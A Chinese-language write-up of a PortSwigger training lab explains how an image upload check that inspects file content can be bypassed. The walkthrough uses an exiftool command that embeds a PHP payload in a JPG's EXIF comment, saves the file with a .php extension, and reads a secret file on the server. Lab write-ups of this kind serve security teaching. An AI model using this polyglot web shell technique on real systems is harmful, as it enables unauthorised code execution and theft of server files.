# 通过多语言Web shell上传实现RCE WP

来源：portswigger

题目描述：

该LAB包含一个存在漏洞的图像上传功能，尽管该功能会检查文件内容以验证其为真实图像，但用户仍可上传并执行服务器端代码。

要完成该实验，请上传一个基础的PHP网页shell,然后利用它窃取文件内容。

用户密码：`wiener:peter`



### solution：

根据题目描述，该应用程序不信文件名和/MIME等，真的会去解析图片的内容，所以我们就必须让图片本身是合法的，利用`exiftool` ,来给图片中加内容。

#### 漏洞原理：

利用EXIF元数据把PHP代码藏进一个完全合法的图片文件中，而服务器在”验证图片“和”执行文件“这两个阶段做的是两套完全不同的事情。

服务器在上传时，会检查图片是否为”真图片“

在访问时，根据文件扩展名来决定是否执行，`.php` 交给PHP引擎

我们最后用`exiftool` 生成的文件到底是什么？

- 图片解析器   完全正常的JPG
- PHP解析器   完整的PHP代码



##### 第一步：

尝试直接上传PHP文件，查看返回，会被forbidden

##### 第二步：

构造 `tpmm.php` ,用来通过图片检验，并且在EXIF Comment中包含PHP

具体方法：

在kali中用exiftool命令行：

```
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" 2.jpg -o tpmm.php
```

就会生成一个文件：`tpmm.php` 

##### 第三步：

上传生成的PHP文件，

![image-20251223121025039](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251223121025039.png)

上传成功，返回200.

##### 第四步：

查看上传的文件：

![image-20251223121101445](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251223121101445.png)

发现返回的图片码，由于我们在写命令行的命令时回显了 `secret` 

```
echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'
```

该密码会出现在start和end之间，所以就可以找到了。

![image-20251223121302322](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251223121302322.png)



#### 总结：

我们通过exiftool在图片的元数据区域写入PHP代码，并且生成代码。

让服务器在验证是否为图片的能够通过，且访问时，又能以PHP来解析。

